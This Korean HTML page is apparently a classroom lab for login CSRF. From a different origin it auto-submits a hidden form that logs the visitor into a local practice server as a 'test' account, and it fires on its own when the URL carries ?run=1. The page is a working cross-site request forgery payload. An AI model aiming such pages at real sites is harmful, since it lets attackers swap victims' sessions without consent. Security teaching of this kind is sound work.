<!doctype html><html lang="ko"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>로그인 CSRF 실습</title><style>body{font:16px/1.8 sans-serif;max-width:650px;margin:70px auto;padding:24px;background:#f7f3fb;color:#342846}button{padding:12px 20px;background:#7451a6;color:white;border:0;border-radius:10px}</style></head><body><h1>로그인 CSRF 실습</h1><p>이 페이지는 Python 사이트와 다른 출처(localhost:8000)에서 로그인 요청을 보냅니다. Python 서버에 test 계정으로 로그인되며, 기존 로그인 계정이 있다면 test로 바뀝니다.</p><form id="attack" method="post" action="http://localhost:10002/login"><input type="hidden" name="user_id" value="test"><input type="hidden" name="password" value="test1234"><button>테스트 계정 로그인 요청 보내기</button></form><p>?run=1이 붙은 실습 URL을 열면 자동으로 요청을 전송합니다. 이동 후 오른쪽 위 계정 또는 프로필을 확인하세요.</p><script>if(new URLSearchParams(location.search).get('run')==='1')document.getElementById('attack').submit();</script></body></html>
